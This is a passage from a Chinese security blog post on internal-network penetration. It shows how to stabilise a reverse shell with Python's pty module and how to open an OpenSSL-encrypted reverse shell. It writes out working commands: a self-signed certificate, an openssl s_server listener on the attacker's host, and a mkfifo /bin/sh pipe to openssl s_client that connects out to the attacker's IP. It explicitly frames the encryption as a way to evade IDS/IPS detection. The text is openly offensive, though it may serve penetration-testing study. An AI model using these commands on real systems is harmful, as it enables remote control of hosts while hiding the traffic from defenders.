+<p>将生成的python反弹shell的一句话在目标主机上执行即可：</p>
+<h2 id="0x07-反弹shell后获取模拟终端"><a href="#0x07-反弹shell后获取模拟终端" class="headerlink" title="0x07 反弹shell后获取模拟终端"></a><strong>0x07 反弹shell后获取模拟终端</strong></h2><p>其实，上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。</p>
+<p><strong>•获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。</strong><br><strong>•标准的错误输出无法显示，无法正常使用vim等文本编辑器等。</strong><br><strong>•获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</strong></p>
+<p>这往往都是因为我们获取的shell并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。</p>
+<p>我们其实可以借助于python默认包含的一个pty标准库来获取一个标准的虚拟终端环境。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p>
+<p>我们只需在获取的shell里面输入如下命令，即可模拟一个终端设备：</p>
+<pre class="line-numbers language-python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"import pty;pty.spawn('/bin/bash')"</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161637555.png" alt="img"></p>
+<p>如上图所示，成功模拟在shell中出了一个终端设备，并成功执行了sudo等命令。</p>
+<h2 id="0x08-使用OpenSSL反弹加密shell"><a href="#0x08-使用OpenSSL反弹加密shell" class="headerlink" title="0x08 使用OpenSSL反弹加密shell"></a><strong>0x08 使用OpenSSL反弹加密shell</strong></h2><p>在上文中，我们总结了很多反弹shell得方法，但是我发现这种反弹 shell 方式都有一个缺点，那就是<strong>所有的流量都是明文传输的</strong>。这些通过shell通过传输的流量都可以被管理员直接抓取并理解，当目标主机网络环境存在网络防御检测系统时（IDS、IPS等），网络防御检测系统会获取到我们的通信内容并进行告警和阻止。因此，我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。</p>
+<h3 id="OpenSSL-简介"><a href="#OpenSSL-简介" class="headerlink" title="OpenSSL 简介"></a><strong>OpenSSL 简介</strong></h3><p>在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。</p>
+<p>SSL协议要求建立在可靠的传输层协议(TCP)之上。SSL协议的优势在于它是与应用层协议独立无关的，高层的应用层协议(例如：HTTP，FTP，TELNET等)能透明地建立于SSL协议之上。SSL协议在应用层协议通信之前就已经完成加密算法、通信密钥的协商及服务器认证工作。在此之后应用层协议所传送的数据都会被加密，从而保证通信的私密性。</p>
+<p>在利用 OpenSSL 反弹 shell 之前需要先生成自签名证书：</p>
+<pre class="line-numbers language-python"><code class="language-python">openssl req <span class="token operator">-</span>x509 <span class="token operator">-</span>newkey rsa<span class="token punctuation">:</span><span class="token number">2048</span> <span class="token operator">-</span>keyout key<span class="token punctuation">.</span>pem <span class="token operator">-</span>out cert<span class="token punctuation">.</span>pem <span class="token operator">-</span>days <span class="token number">365</span> <span class="token operator">-</span>nodes
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>生成自签名证书时会提示输入证书信息，如果懒得填写可以一路回车即可：</p>
+<p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161637991.png" alt="img"></p>
+<h3 id="使用OpenSSL反弹加密shell"><a href="#使用OpenSSL反弹加密shell" class="headerlink" title="使用OpenSSL反弹加密shell"></a><strong>使用OpenSSL反弹加密shell</strong></h3><p>实验环境：Linux</p>
+<p>目标机：系统：Linux•IP：192.168.1.129</p>
+<p>攻击机：系统：Linux•IP：192.168.1.130</p>
+<p>假设我们从目标机反弹 shell 到攻击机 。首先需要利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口，在这里使用 2333 端口：</p>
+<pre class="line-numbers language-python"><code class="language-python">openssl s_server <span class="token operator">-</span>quiet <span class="token operator">-</span>key key<span class="token punctuation">.</span>pem <span class="token operator">-</span>cert cert<span class="token punctuation">.</span>pem <span class="token operator">-</span>port <span class="token number">2333</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>此时 OpenSSL 便在攻击机的 2333 端口上启动了一个 SSL/TLS server。</p>
+<p>这时在目标机进行反弹 shell 操作，命令为：</p>
+<pre class="line-numbers language-python"><code class="language-python">mkfifo <span class="token operator">/</span>tmp<span class="token operator">/</span>s<span class="token punctuation">;</span> <span class="token operator">/</span>bin<span class="token operator">/</span>sh <span class="token operator">-</span>i <span class="token operator">&lt;</span> <span class="token operator">/</span>tmp<span class="token operator">/</span>s <span class="token number">2</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token number">1</span> <span class="token operator">|</span> openssl s_client <span class="token operator">-</span>quiet <span class="token operator">-</span>connect <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.130</span><span class="token punctuation">:</span><span class="token number">2333</span> <span class="token operator">></span> <span class="token operator">/</span>tmp<span class="token operator">/</span>s<span class="token punctuation">;</span> rm <span class="token operator">/</span>tmp<span class="token operator">/</span>s
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这样攻击者便使用 OpenSSL 反弹了目标机一个加密的 shell。</p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:1916003479@qq.com">uf9n1x</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://uf9n1x.top/2023/04/16/nei-wang-shen-tou-wu-fan-dan-shell-zi-shi-shou-ji/">https://uf9n1x.top/2023/04/16/nei-wang-shen-tou-wu-fan-dan-shell-zi-shi-shou-ji/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://uf9n1x.top">Uf9n1x's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><a class="post-meta__tags" href="/tags/shell/">shell</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2023/04/16/phpgc-ji-zhi/"><i class="fa fa-chevron-left">  </i><span>phpGC机制</span></a></div><div class="next-post pull-right"><a href="/2023/04/16/nei-wang-shen-tou-si-fan-dan-shell-yuan-li-qian-xi/"><span>内网渗透（四）反弹shell原理浅析</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://blog-1313934826.cos.ap-chengdu.myqcloud.com/normal-images/psc.png#https://s1.ax1x.com/2023/04/14/p9Sd0ns.png)"><div class="layout" id="footer"><div class="copyright">&copy;2023 By uf9n1x</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>
